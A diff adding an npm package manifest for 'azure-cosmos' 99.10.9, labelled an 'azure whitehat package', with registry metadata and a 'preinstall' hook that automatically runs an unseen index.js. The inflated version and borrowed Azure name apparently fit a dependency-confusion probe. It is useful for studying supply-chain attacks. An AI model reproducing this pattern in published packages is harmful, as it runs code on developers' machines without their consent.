@@ -1,0 +1,39 @@
+{
+    "name": "azure-cosmos",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-cosmos@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-nWY3fiIK8aFe0tbEeIhh8TAs83PJmdsRmd3ivpyLSi4/sZc9Vxyi881vWr345ztY2YW0OHmptewHiYn+yd7TrQ==",
+        "shasum": "e64089d8c64329580804848baaeb3cb4c3d8baa3",
+        "tarball": "https://registry.npmjs.org/azure-cosmos/-/azure-cosmos-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3576,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoS0rCRA9TVsSAnZWagAA288P/1HCAERsn4dAs2/LfJYP\nYHaChz55mtJiS70N8OqaY9nk1JuTH7Ap2KcNMZXAon3uDoocg6ZI6OKx2coO\n0fpPzSQCbMknHp2C3G3plstYgvWRdU4Wukf8YbREN+rF+8hTlP0yyV1rYnw1\nBj8VCJGh80XQ/iBYRbAN1kPzKJE/4IPkV/OB72fMm25Q+FqFUaDHQWXcgiRi\nASM4yFh/mln9hEkgfLUxxlBuDkUCviEAmnDYSeYyeuGwYawAoyPNJzzFzwZV\ntKGUuwCWJqpUxuHrIJo/a9Ol0L5FFluZeAa7ZAUimNIVJHyPfdn5HrADCwbK\nZmT/Rrwq5WnA7UbQpMSjgxiQmgsnnpVWUhGGfpaEOX06kivd/1357qc7jaqa\nClgNwMm4DnTmNTjF51oiKy03q2n9KAPUgFEQ1pjNhNSOYgElkpWAR9RnffTT\n7RJPoOC9FFzkyZxkQ+osdaPUJLdkNXv46n+8C/x+AdP3xg2tMn+hIH48nM4o\nP9C5cQ/i7Ozrcg1LPxcR4/CkfS48qocugRJCX8D59BmfMBLavuM09YQy4f0l\n8TGaUqvgYKHiLDTRqEZr+JMRT4wBForro0xm1Z5acllPTIW6FJ2zPHpnLts6\ncwmEk4tLc9QaKpFCmNEbgZfLWw8ncg1mERtoCEC9XdilMTXO6xr31J5wUj83\n7rj9\r\n=zuO3\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-cosmos_99.10.9_1637952811074_0.3650656262662406"
+    },
+    "_hasShrinkwrap": false
+}
